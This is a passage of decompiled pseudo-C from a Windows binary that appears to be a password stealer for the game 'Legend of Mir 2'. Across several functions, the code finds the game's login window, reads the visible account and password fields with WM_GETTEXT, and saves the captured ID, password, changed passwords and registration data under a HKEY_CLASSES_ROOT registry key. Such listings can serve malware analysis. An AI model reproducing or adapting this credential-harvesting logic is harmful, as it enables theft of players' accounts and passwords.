  v11[1] = (unsigned int)&loc_426B0E;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  v7 = 0;
  sub_42433C(
    "496E646570656E64656E74204269746D61700000006A280000",
    (&off_42B7D0)[a1],
    "1800",
    (volatile __int32 *)&v19,
    0,
    0,
    &v20,
    &v18,
    0,
    0,
    0,
    0,
    150);
  sub_40426C(a2);
  if ( v19 )
  {
    sub_40C670(a1, (volatile __int32 *)&v17);
    v8 = sub_40471C(v17);
    sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "addresssj1", 1, (BYTE *)v8);
    sub_40C670(v20, (volatile __int32 *)&v16);
    v9 = sub_40471C(v16);
    sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "addresssj2", 1, (BYTE *)v9);
    if ( (int)sub_404804("Independent Bitmapj(", v19) > 0 )
      sub_4047BC(&v19, 1, 20);
    sub_4042C0(a2, (__int32)v19);
    LOBYTE(v7) = 1;
  }
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_426B15;
  sub_404290((int)&v16, 4);
  return v7;
}
// 426A0C: could not find valid save-restore pair for ebx
// 426A0C: could not find valid save-restore pair for edi
// 426A0C: could not find valid save-restore pair for esi
// 42B7D0: using guessed type char *off_42B7D0;

//----- (00426BB4) --------------------------------------------------------
_DWORD *__usercall sub_426BB4@<eax>(volatile __int32 *a1@<eax>, int a2@<ebx>, int a3@<edi>)
{
  int v4; // ebx
  unsigned int v6[2]; // [esp-14h] [ebp-18h] BYREF
  int *v7; // [esp-Ch] [ebp-10h]
  __int32 v8; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v8 = 0;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_426C36;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  if ( dword_42E14C )
  {
    sub_426A0C(dword_42E14C - 1, &v8, a2, a3, (int)a1);
  }
  else
  {
    v4 = 0;
    while ( 1 )
    {
      PeekMessageA(&Msg, 0, 0, 0, 1u);
      if ( (unsigned __int8)sub_426A0C(v4, &v8, v4, a3, (int)a1) )
        break;
      if ( ++v4 == 5 )
        goto LABEL_8;
    }
    dword_42E14C = v4 + 1;
  }
LABEL_8:
  sub_4042C0(a1, v8);
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_426C3D;
  return sub_40426C(&v8);
}
// 42E14C: using guessed type int dword_42E14C;

//----- (00426C44) --------------------------------------------------------
char sub_426C44()
{
  int v0; // ebx
  char result; // al

  if ( dword_42E150 )
    return sub_4264A4(dword_42E150 - 1);
  v0 = 0;
  while ( 1 )
  {
    PeekMessageA(&Msg, 0, 0, 0, 1u);
    result = sub_4264A4(v0);
    if ( result )
      break;
    if ( ++v0 == 6 )
      return result;
  }
  result = v0 + 1;
  dword_42E150 = v0 + 1;
  return result;
}
// 42E150: using guessed type int dword_42E150;

//----- (00426C8C) --------------------------------------------------------
int __usercall sub_426C8C@<eax>(int a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>)
{
  int v5; // esi
  int v6; // edi
  int v7; // ebx
  char *v8; // eax
  char *v10; // [esp-1Ch] [ebp-30h]
  unsigned int v11[2]; // [esp-18h] [ebp-2Ch] BYREF
  int *v12; // [esp-10h] [ebp-24h]
  int v13; // [esp-Ch] [ebp-20h]
  int v14; // [esp-8h] [ebp-1Ch]
  int v15; // [esp-4h] [ebp-18h]
  char *v16; // [esp+0h] [ebp-14h] BYREF
  char *v17; // [esp+4h] [ebp-10h] BYREF
  __int32 v18; // [esp+8h] [ebp-Ch] BYREF
  __int32 v19; // [esp+Ch] [ebp-8h] BYREF
  char *v20; // [esp+10h] [ebp-4h] BYREF
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v20 = 0;
  v19 = 0;
  v18 = 0;
  v17 = 0;
  v16 = 0;
  v15 = a2;
  v14 = a4;
  v13 = a3;
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_426DAB;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  sub_405748(&dword_42E148, (int)dword_424270, (void *)1, a1);
  v5 = (336 - 42 * a1) / 2 + 141;
  if ( a1 - 1 >= 0 )
  {
    v6 = a1;
    v7 = 0;
    do
    {
      *(_DWORD *)(dword_42E148 + 8 * v7) = v5 + 42 * v7;
      *(_DWORD *)(dword_42E148 + 8 * v7 + 4) = v5 + 42 * (v7 + 1);
      sub_40C670(*(_DWORD *)(dword_42E148 + 8 * v7), &v19);
      sub_40C670(*(_DWORD *)(dword_42E148 + 8 * v7 + 4), &v18);
      sub_4045E4((volatile __int32 *)&v20, 5);
      v10 = sub_40471C(v20);
      sub_40C670(v7, (volatile __int32 *)&v16);
      sub_404570((volatile __int32 *)&v17, (char *)&dword_426DE8, v16);
      v8 = sub_40471C(v17);
      sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", v8, 1, (BYTE *)v10);
      ++v7;
      --v6;
    }
    while ( v6 );
  }
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_426DB2;
  return sub_404290((int)&v16, 5);
}
// 426C8C: could not find valid save-restore pair for ebx
// 426C8C: could not find valid save-restore pair for edi
// 426C8C: could not find valid save-restore pair for esi
// 424270: using guessed type int dword_424270[3];
// 426DE8: using guessed type int dword_426DE8;
// 42E148: using guessed type int dword_42E148;

//----- (00426DFC) --------------------------------------------------------
int __usercall sub_426DFC@<eax>(int a1@<eax>, int a2@<edi>, int a3@<esi>)
{
  HWND WindowA; // esi
  char *v5; // eax
  bool v6; // zf
  int v7; // ebx
  char *v8; // eax
  HWND v9; // eax
  HWND Window; // eax
  HWND v11; // esi
  char *v12; // eax
  bool v13; // zf
  LPARAM v14; // ebx
  HWND *v15; // edi
  char *v16; // eax
  char *v17; // ecx
  int v18; // eax
  int v19; // eax
  int v20; // edi
  int v21; // ebx
  char *v22; // eax
  char *v23; // eax
  int v24; // ebx
  char *v25; // eax
  char *v26; // eax
  char *v27; // eax
  char *v28; // eax
  char *v29; // eax
  int v30; // ebx
  char *v31; // eax
  char *v32; // eax
  int v33; // edi
  HWND *v34; // esi
  BYTE *v35; // ebx
  char *v36; // eax
  int v37; // ebx
  char *v38; // eax
  char *v39; // eax
  int v40; // edi
  HWND *v41; // ebx
  BYTE *v42; // esi
  char *v43; // eax
  const CHAR *ExceptionList; // [esp-4h] [ebp-13Ch] BYREF
  __int64 ForegroundWindow; // [esp+0h] [ebp-138h]
  unsigned int v47[2]; // [esp+8h] [ebp-130h] BYREF
  int *v48; // [esp+10h] [ebp-128h]
  char *v49; // [esp+20h] [ebp-118h] BYREF
  char *v50; // [esp+24h] [ebp-114h] BYREF
  char *v51; // [esp+28h] [ebp-110h] BYREF
  char *v52; // [esp+2Ch] [ebp-10Ch] BYREF
  char *v53; // [esp+30h] [ebp-108h] BYREF
  char *v54; // [esp+34h] [ebp-104h] BYREF
  char *v55; // [esp+38h] [ebp-100h] BYREF
  char *v56; // [esp+3Ch] [ebp-FCh] BYREF
  char *v57; // [esp+40h] [ebp-F8h] BYREF
  char *v58; // [esp+44h] [ebp-F4h] BYREF
  __int32 v59; // [esp+48h] [ebp-F0h] BYREF
  __int32 v60; // [esp+4Ch] [ebp-ECh] BYREF
  char *v61; // [esp+50h] [ebp-E8h] BYREF
  char *v62; // [esp+54h] [ebp-E4h] BYREF
  char *v63; // [esp+58h] [ebp-E0h] BYREF
  char *v64; // [esp+5Ch] [ebp-DCh] BYREF
  char *v65; // [esp+60h] [ebp-D8h] BYREF
  char *v66; // [esp+64h] [ebp-D4h] BYREF
  char *v67; // [esp+68h] [ebp-D0h] BYREF
  char *v68; // [esp+6Ch] [ebp-CCh] BYREF
  char *v69; // [esp+70h] [ebp-C8h] BYREF
  __int32 v70; // [esp+74h] [ebp-C4h] BYREF
  const CHAR *v71; // [esp+78h] [ebp-C0h] BYREF
  char *v72; // [esp+7Ch] [ebp-BCh] BYREF
  char *v73; // [esp+80h] [ebp-B8h] BYREF
  char *v74; // [esp+84h] [ebp-B4h] BYREF
  char *v75; // [esp+88h] [ebp-B0h] BYREF
  char *v76; // [esp+8Ch] [ebp-ACh] BYREF
  char *v77; // [esp+90h] [ebp-A8h] BYREF
  char *v78; // [esp+94h] [ebp-A4h] BYREF
  char *v79; // [esp+98h] [ebp-A0h] BYREF
  char *v80; // [esp+9Ch] [ebp-9Ch] BYREF
  __int32 v81; // [esp+A0h] [ebp-98h] BYREF
  __int32 v82; // [esp+A4h] [ebp-94h] BYREF
  char *v83; // [esp+A8h] [ebp-90h] BYREF
  char *v84; // [esp+ACh] [ebp-8Ch] BYREF
  char *v85; // [esp+B0h] [ebp-88h] BYREF
  RECT rc; // [esp+B4h] [ebp-84h] BYREF
  char v87[76]; // [esp+C4h] [ebp-74h] BYREF
  int v88; // [esp+110h] [ebp-28h]
  char *v89; // [esp+114h] [ebp-24h] BYREF
  int v90; // [esp+118h] [ebp-20h] BYREF
  char *v91; // [esp+11Ch] [ebp-1Ch] BYREF
  int v92; // [esp+120h] [ebp-18h]
  int v93; // [esp+124h] [ebp-14h]
  int v94; // [esp+128h] [ebp-10h]
  HWND hWndChildAfter; // [esp+12Ch] [ebp-Ch]
  struct tagPOINT Point; // [esp+130h] [ebp-8h] BYREF
  int savedregs; // [esp+138h] [ebp+0h] BYREF

  v48 = &savedregs;
  v47[1] = (unsigned int)&loc_427C87;
  v47[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v47);
  if ( a1 == 513 )
  {
    PeekMessageA(&Msg, 0, 0, 0, 1u);
    sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Flag2", &v85);
    Delphi_CompareCall_404668((int)v85, &dword_427CB8);
    if ( v6 )
      goto LABEL_132;
    sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Flag1", &v84);
    Delphi_CompareCall_404668((int)v84, &dword_427CB8);
    if ( v6 )
    {
      sub_4254C4(513, a2, a3);
      goto LABEL_132;
    }
  }
  sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Flag", &v83);
  Delphi_CompareCall_404668((int)v83, &dword_427CB8);
  if ( v6 )
  {
    if ( a1 == 513 )
    {
      WindowA = FindWindowA("TfrmMain", "legend of mir2");
      if ( !WindowA )
      {
        sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "realtitle", &v91);
        if ( v91 )
        {
          v5 = sub_40471C(v91);
          WindowA = FindWindowA("TfrmMain", v5);
        }
      }
      if ( WindowA )
      {
        ForegroundWindow = (unsigned int)GetForegroundWindow();
        v6 = (int)WindowA >= 0;
        if ( (int)WindowA >= 0 )
          v6 = WindowA == (HWND)ForegroundWindow;
        if ( v6 )
        {
          GetCursorPos(&Point);
          rc.left = 385;
          rc.top = 458;
          rc.right = 430;
          rc.bottom = 478;
          if ( PtInRect(&rc, Point) )
          {
            sub_426BB4(&v82, 513, a2);
            v94 = sub_40DB58(v82, &dword_427CEC);
            sub_424DD4(v94);
          }
          rc.left = 382;
          rc.top = 548;
          rc.right = 432;
          rc.bottom = 568;
          if ( PtInRect(&rc, Point) )
          {
            sub_426BB4(&v81, 513, a2);
            v94 = sub_40DB58(v81, &dword_427CEC);
            sub_424DD4(v94);
          }
        }
      }
    }
  }
  else if ( a1 == 513 )
  {
    hWndChildAfter = 0;
    v94 = 0;
    v93 = 0;
    v92 = 0;
    v7 = 19;
    v8 = v87;
    do
    {
      *(_DWORD *)v8 = 0;
      v8 += 4;
      --v7;
    }
    while ( v7 );
    v9 = FindWindowA("TfrmMain", "");
    Window = FindWindowExA(v9, 0, "TComboBox", 0);
    SendMessageA(Window, 0xDu, 0x100u, (LPARAM)&ExistingFileName);
    sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Area", &v80);
    HIDWORD(ForegroundWindow) = v80;
    sub_4044D4(&v79, (char *)&ExistingFileName, 256);
    Delphi_CompareCall_404668(SHIDWORD(ForegroundWindow), (int *)v79);
    if ( !v6 )
      sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "Area", 1, &ExistingFileName);
    v11 = FindWindowA("TfrmMain", "legend of mir2");
    if ( !v11 )
    {
      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "realtitle", &v91);
      if ( v91 )
      {
        v12 = sub_40471C(v91);
        v11 = FindWindowA("TfrmMain", v12);
      }
    }
    if ( v11 )
    {
      ForegroundWindow = (unsigned int)GetForegroundWindow();
      v13 = (int)v11 >= 0;
      if ( (int)v11 >= 0 )
        v13 = v11 == (HWND)ForegroundWindow;
      if ( v13 )
      {
        v14 = 19;
        v15 = (HWND *)v87;
        do
        {
          *v15 = FindWindowExA(v11, hWndChildAfter, "TEdit", 0);
          hWndChildAfter = *v15;
          if ( !hWndChildAfter )
            break;
          ++v93;
          if ( IsWindowVisible(hWndChildAfter) )
            ++v94;
          ++v15;
          --v14;
        }
        while ( v14 );
        GetCursorPos(&Point);
        rc.left = 425;
        rc.top = 337;
        rc.right = 495;
        rc.bottom = 365;
        if ( v94 == 2 )
        {
          if ( PtInRect(&rc, Point) )
          {
            v15 = (HWND *)v93;
            if ( v93 > 0 )
            {
              v11 = (HWND)v87;
              v14 = (LPARAM)&byte_42CE3C;
              do
              {
                if ( *(_DWORD *)v11 && IsWindowVisible(*(HWND *)v11) )
                {
                  SendMessageA(*(HWND *)v11, 0xDu, 0x100u, v14);
                  if ( v92 )
                  {
                    sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "ID", 1, (BYTE *)v14);
                  }
                  else
                  {
                    sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "PW", 1, (BYTE *)v14);
                    dword_42E13C = *(_DWORD *)v11;
                  }
                  ++v92;
                }
                v14 += 256;
                ++v11;
                v15 = (HWND *)((char *)v15 - 1);
              }
              while ( v15 );
            }
          }
        }
        rc.left = 308;
        rc.top = 141;
        rc.right = 476;
        rc.bottom = 477;
        if ( !v94 && v93 >= 2 && PtInRect(&rc, Point) )
        {
          sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "WinX", &v78);
          Delphi_CompareCall_404668((int)v78, &dword_427CB8);
          if ( v6 )
            sub_426C44();
          if ( (unsigned __int8)sub_40E944("ID", HKEY_CLASSES_ROOT, "legend of mir2", v14)
            && (unsigned __int8)sub_40E944("PW", HKEY_CLASSES_ROOT, "legend of mir2", v14) )
          {
            sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "Flag", 1, (BYTE *)"1");
            sub_4044D4(&v77, (char *)&ExistingFileName, 256);
            if ( v77 )
            {
              sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_427D2C, 1, &ExistingFileName);
            }
            else
            {
              sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Area", &v76);
              v16 = sub_40471C(v76);
              sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_427D2C, 1, (BYTE *)v16);
            }
            HIDWORD(ForegroundWindow) = &savedregs;
            LODWORD(ForegroundWindow) = &loc_4273D7;
            ExceptionList = (const CHAR *)NtCurrentTeb()->NtTib.ExceptionList;
            __writefsdword(0, (unsigned int)&ExceptionList);
            sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "ServerListCount", &v75);
            v18 = sub_40C610((int)v75, v17);
            sub_426C8C(v18, v18, (int)v15, (int)v11);
            __writefsdword(0, (unsigned int)ExceptionList);
            v19 = sub_405594(dword_42E148);
            if ( v19 >= 0 )
            {
              v20 = v19 + 1;
              v21 = 0;
              while ( *(_DWORD *)(dword_42E148 + 8 * v21) >= Point.y
                   || Point.y >= *(_DWORD *)(dword_42E148 + 8 * v21 + 4) )
              {
                ++v21;
                if ( !--v20 )
                  goto LABEL_62;
              }
              HIDWORD(ForegroundWindow) = &v90;
              sub_40C670(v21 + 1, (volatile __int32 *)&v73);
              sub_404570((volatile __int32 *)&v74, "ServerList", v73);
              v22 = sub_40471C(v74);
              sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", v22, (char **)HIDWORD(ForegroundWindow));
            }
LABEL_62:
            HIDWORD(ForegroundWindow) = v90;
            LODWORD(ForegroundWindow) = dword_427D60;
            sub_40C670(Point.x, (volatile __int32 *)&v71);
            ExceptionList = v71;
            sub_40C670(Point.y, &v70);
            sub_4045E4((volatile __int32 *)&v72, 6);
            v23 = sub_40471C(v72);
            sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)&dword_427D7C, 1, (BYTE *)v23);
          }
          sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "WinX", &v69);
          Delphi_CompareCall_404668((int)v69, &dword_427CB8);
          if ( v6 )
            sub_426C44();
        }
        rc.left = 489;
        rc.top = 102;
        rc.right = 505;
        rc.bottom = 127;
        if ( !v94 && v93 >= 2 && PtInRect(&rc, Point) )
        {
          sub_426C44();
          v24 = 1;
          sub_40426C(&v91);
          while ( 1 )
          {
            sub_40C670(v24, (volatile __int32 *)&v68);
            v25 = sub_40471C(v68);
            if ( !(unsigned __int8)sub_40E97C(HKEY_CLASSES_ROOT, "legend of mir2\\Enter", v25) )
              break;
            if ( ++v24 > 99 )
              goto LABEL_72;
          }
          sub_40C670(v24, (volatile __int32 *)&v91);
LABEL_72:
          if ( (unsigned __int8)sub_40E944("ID", HKEY_CLASSES_ROOT, "legend of mir2", v24)
            && (unsigned __int8)sub_40E944("PW", HKEY_CLASSES_ROOT, "legend of mir2", v24) )
          {
            sub_4044D4(&v67, (char *)&ExistingFileName, 256);
            if ( v67 )
            {
              sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_427D2C, 1, &ExistingFileName);
            }
            else
            {
              sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Area", &v66);
              v26 = sub_40471C(v66);
              sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_427D2C, 1, (BYTE *)v26);
            }
            sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "ID", &v65);
            HIDWORD(ForegroundWindow) = sub_40471C(v65);
            LODWORD(ForegroundWindow) = 1;
            sub_404570((volatile __int32 *)&v64, "legend of mir2\\Enter\\", v91);
            v27 = sub_40471C(v64);
            sub_40E67C(HKEY_CLASSES_ROOT, v27, "ID", ForegroundWindow, (BYTE *)HIDWORD(ForegroundWindow));
            sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "PW", &v63);
            HIDWORD(ForegroundWindow) = sub_40471C(v63);
            LODWORD(ForegroundWindow) = 1;
            sub_404570((volatile __int32 *)&v62, "legend of mir2\\Enter\\", v91);
            v28 = sub_40471C(v62);
            sub_40E67C(HKEY_CLASSES_ROOT, v28, "PW", ForegroundWindow, (BYTE *)HIDWORD(ForegroundWindow));
            HIDWORD(ForegroundWindow) = dword_427DC0;
            sub_40C670(Point.x, &v60);
            LODWORD(ForegroundWindow) = v60;
            ExceptionList = (const CHAR *)dword_427D6C;
            sub_40C670(Point.y, &v59);
            sub_4045E4((volatile __int32 *)&v61, 5);
            HIDWORD(ForegroundWindow) = sub_40471C(v61);
            LODWORD(ForegroundWindow) = 1;
            sub_404570((volatile __int32 *)&v58, "legend of mir2\\Enter\\", v91);
            v29 = sub_40471C(v58);
            sub_40E67C(
              HKEY_CLASSES_ROOT,
              v29,
              (const CHAR *)&dword_427D7C,
              ForegroundWindow,
              (BYTE *)HIDWORD(ForegroundWindow));
            sub_40E6F4("ID", HKEY_CLASSES_ROOT, "legend of mir2");
            sub_40E6F4("PW", HKEY_CLASSES_ROOT, "legend of mir2");
          }
          sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "WinX", &v57);
          Delphi_CompareCall_404668((int)v57, &dword_427CB8);
          if ( v6 )
            sub_426C44();
        }
        rc.left = 372;
        rc.top = 404;
        rc.right = 445;
        rc.bottom = 432;
        if ( v94 == 4 && PtInRect(&rc, Point) )
        {
          v30 = 1;
          sub_40426C(&v91);
          while ( 1 )
          {
            sub_40C670(v30, (volatile __int32 *)&v56);
            v31 = sub_40471C(v56);
            if ( !(unsigned __int8)sub_40E97C(HKEY_CLASSES_ROOT, "legend of mir2\\Change password", v31) )
              break;
            if ( ++v30 > 99 )
              goto LABEL_86;
          }
          sub_40C670(v30, (volatile __int32 *)&v91);
LABEL_86:
          v88 = 1;
          sub_4044D4(&v55, (char *)&ExistingFileName, 256);
          if ( v55 )
          {
            sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_427D2C, 1, &ExistingFileName);
          }
          else
          {
            sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Area", &v54);
            v32 = sub_40471C(v54);
            sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_427D2C, 1, (BYTE *)v32);
          }
          v33 = v93;
          if ( v93 > 0 )
          {
            v34 = (HWND *)v87;
            v35 = &byte_42CE3C;
            do
            {
              if ( *v34 && IsWindowVisible(*v34) )
              {
                switch ( v88 )
                {
                  case 1:
                    sub_404304((volatile __int32 *)&v89, (__int32)dword_427DF0);
                    break;
                  case 2:
                    sub_404304((volatile __int32 *)&v89, (__int32)dword_427DFC);
                    break;
                  case 3:
                    sub_404304((volatile __int32 *)&v89, (__int32)dword_427E08);
                    break;
                  case 4:
                    sub_404304((volatile __int32 *)&v89, (__int32)dword_427E14);
                    break;
                }
                SendMessageA(*v34, 0xDu, 0x100u, (LPARAM)v35);
                HIDWORD(ForegroundWindow) = v35;
                LODWORD(ForegroundWindow) = 1;
                ExceptionList = sub_40471C(v89);
                sub_404570((volatile __int32 *)&v53, "legend of mir2\\Change password\\", v91);
                v36 = sub_40471C(v53);
                sub_40E67C(HKEY_CLASSES_ROOT, v36, ExceptionList, ForegroundWindow, (BYTE *)HIDWORD(ForegroundWindow));
                ++v88;
              }
              v35 += 256;
              ++v34;
              --v33;
            }
            while ( v33 );
          }
        }
        rc.left = 240;
        rc.top = 480;
        rc.right = 313;
        rc.bottom = 509;
        if ( v94 == 12 && PtInRect(&rc, Point) )
        {
          v37 = 1;
          sub_40426C(&v91);
          while ( 1 )
          {
            sub_40C670(v37, (volatile __int32 *)&v52);
            v38 = sub_40471C(v52);
            if ( !(unsigned __int8)sub_40E97C(HKEY_CLASSES_ROOT, "legend of mir2\\Registry", v38) )
              break;
            if ( ++v37 > 99 )
              goto LABEL_110;
          }
          sub_40C670(v37, (volatile __int32 *)&v91);
LABEL_110:
          v88 = 1;
          sub_4044D4(&v51, (char *)&ExistingFileName, 256);
          if ( v51 )
          {
            sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_427D2C, 1, &ExistingFileName);
          }
          else
          {
            sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Area", &v50);
            v39 = sub_40471C(v50);
            sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_427D2C, 1, (BYTE *)v39);
          }
          v40 = v93;
          if ( v93 > 0 )
          {
            v41 = (HWND *)v87;
            v42 = &byte_42CE3C;
            do
            {
              if ( *v41 && IsWindowVisible(*v41) )
              {
                switch ( v88 )
                {
                  case 1:
                    sub_404304((volatile __int32 *)&v89, (__int32)dword_427E60);
                    break;
                  case 2:
                    sub_404304((volatile __int32 *)&v89, (__int32)dword_427E6C);
                    break;
                  case 3:
                    sub_404304((volatile __int32 *)&v89, (__int32)dword_427E78);
                    break;
                  case 4:
                    sub_404304((volatile __int32 *)&v89, (__int32)dword_427E84);
                    break;
                  case 5:
                    sub_404304((volatile __int32 *)&v89, (__int32)dword_427E90);
                    break;
                  case 6:
                    sub_404304((volatile __int32 *)&v89, (__int32)dword_427E9C);
                    break;
                  case 7:
                    sub_404304((volatile __int32 *)&v89, (__int32)dword_427EA8);
                    break;
                  case 8:
                    sub_404304((volatile __int32 *)&v89, (__int32)dword_427EB4);
                    break;
                  case 9:
                    sub_404304((volatile __int32 *)&v89, (__int32)dword_427EC0);
                    break;
                  case 10:
                    sub_404304((volatile __int32 *)&v89, (__int32)dword_427DF0);
                    break;
                  case 11:
                    sub_404304((volatile __int32 *)&v89, (__int32)dword_427ECC);
                    break;
                  case 12:
                    sub_404304((volatile __int32 *)&v89, (__int32)dword_427E14);
                    break;
                  default:
                    break;
                }
                SendMessageA(*v41, 0xDu, 0x100u, (LPARAM)v42);
                HIDWORD(ForegroundWindow) = v42;
                LODWORD(ForegroundWindow) = 1;
                ExceptionList = sub_40471C(v89);
                sub_404570((volatile __int32 *)&v49, "legend of mir2\\Registry\\", v91);
                v43 = sub_40471C(v49);
                sub_40E67C(HKEY_CLASSES_ROOT, v43, ExceptionList, ForegroundWindow, (BYTE *)HIDWORD(ForegroundWindow));
                ++v88;
              }
              v42 += 256;
              ++v41;
              --v40;
            }
            while ( v40 );
          }
        }
      }
    }
  }
LABEL_132:
  __writefsdword(0, v47[0]);
  v48 = (int *)&loc_427C8E;
  sub_404290((int)&v49, 37);
  return sub_404290((int)&v89, 3);
}
// 426E63: variable 'v6' is possibly undefined
// 4273BF: variable 'v17' is possibly undefined
// 427CB8: using guessed type int dword_427CB8;
// 427CEC: using guessed type int dword_427CEC;
// 427D2C: using guessed type int dword_427D2C[2];
// 427D60: using guessed type int dword_427D60[3];
// 427D6C: using guessed type int dword_427D6C[3];
// 427D7C: using guessed type int dword_427D7C;
// 427DC0: using guessed type int dword_427DC0[2];
// 427DF0: using guessed type int dword_427DF0[3];
// 427DFC: using guessed type int dword_427DFC[3];
// 427E08: using guessed type int dword_427E08[3];
// 427E14: using guessed type int dword_427E14[3];
// 427E60: using guessed type int dword_427E60[3];
// 427E6C: using guessed type int dword_427E6C[3];
// 427E78: using guessed type int dword_427E78[3];
// 427E84: using guessed type int dword_427E84[3];
// 427E90: using guessed type int dword_427E90[3];
// 427E9C: using guessed type int dword_427E9C[3];
// 427EA8: using guessed type int dword_427EA8[3];
// 427EB4: using guessed type int dword_427EB4[3];
// 427EC0: using guessed type int dword_427EC0[3];
// 427ECC: using guessed type int dword_427ECC[3];
// 42E13C: using guessed type int dword_42E13C;
// 42E148: using guessed type int dword_42E148;

//----- (00427EF4) --------------------------------------------------------
int __usercall sub_427EF4@<eax>(int a1@<eax>)
{
  int v1; // edx

  v1 = 0;
  if ( a1 == 7181 )
    LOBYTE(v1) = 1;
  return v1;
}

//----- (00427F04) --------------------------------------------------------
_DWORD *__usercall sub_427F04@<eax>(int a1@<eax>)
{
  HWND v1; // edi
  int v2; // esi
  char *v3; // eax
  char *v4; // eax
  int v5; // esi
  char *v6; // ebx
  bool v7; // zf
  int v8; // edi
  HWND *v9; // ebx
  BYTE *v10; // esi
  HWND Focus; // [esp+0h] [ebp-84h]
  unsigned int v13[2]; // [esp+8h] [ebp-7Ch] BYREF
  int *v14; // [esp+10h] [ebp-74h]
  char *v15; // [esp+20h] [ebp-64h] BYREF
  char v16[76]; // [esp+24h] [ebp-60h] BYREF
  char *v17; // [esp+70h] [ebp-14h] BYREF
  int v18; // [esp+74h] [ebp-10h]
  int v19; // [esp+78h] [ebp-Ch]
  int v20; // [esp+7Ch] [ebp-8h]
  HWND hWndParent; // [esp+80h] [ebp-4h]
  int savedregs; // [esp+84h] [ebp+0h] BYREF

  v15 = 0;
  v17 = 0;
  v14 = &savedregs;
  v13[1] = (unsigned int)&loc_4280D2;
  v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  if ( (unsigned __int8)sub_427EF4(*(_DWORD *)(a1 + 4)) )
  {
    sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Flag1", &v15);
    Delphi_CompareCall_404668((int)v15, &dword_428100);
    if ( !v7 )
    {
      v1 = 0;
      v20 = 0;
      v19 = 0;
      v18 = 0;
      v2 = 19;
      v3 = v16;
      do
      {
        *(_DWORD *)v3 = 0;
        v3 += 4;
        --v2;
      }
      while ( v2 );
      hWndParent = FindWindowA("TfrmMain", "legend of mir2");
      if ( !hWndParent )
      {
        sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "realtitle", &v17);
        if ( v17 )
        {
          v4 = sub_40471C(v17);
          hWndParent = FindWindowA("TfrmMain", v4);
        }
      }
      v5 = 19;
      v6 = v16;
      do
      {
        *(_DWORD *)v6 = FindWindowExA(hWndParent, v1, "TEdit", 0);
        v1 = *(HWND *)v6;
        if ( !*(_DWORD *)v6 )
          break;
        ++v19;
        if ( IsWindowVisible(v1) )
        {
          if ( ++v20 == 1 )
            dword_42E13C = (int)v1;
        }
        v6 += 4;
        --v5;
      }
      while ( v5 );
      if ( v20 == 2 )
      {
        Focus = GetFocus();
        v7 = dword_42E13C >= 0;
        if ( dword_42E13C >= 0 )
          v7 = dword_42E13C == (_DWORD)Focus;
        if ( v7 )
        {
          v8 = v19;
          if ( v19 > 0 )
          {
            v9 = (HWND *)v16;
            v10 = &byte_42CE3C;
            do
            {
              if ( *v9 && IsWindowVisible(*v9) )
              {
                SendMessageA(*v9, 0xDu, 0x100u, (LPARAM)v10);
                if ( v18 )
                  sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "ID", 1, v10);
                else
                  sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "PW", 1, v10);
                ++v18;
              }
              v10 += 256;
              ++v9;
              --v8;
            }
            while ( v8 );
          }
        }
      }
    }
  }
  __writefsdword(0, v13[0]);
  v14 = (int *)&loc_4280D9;
  sub_40426C(&v15);
  return sub_40426C(&v17);
}
// 427F5F: variable 'v7' is possibly undefined
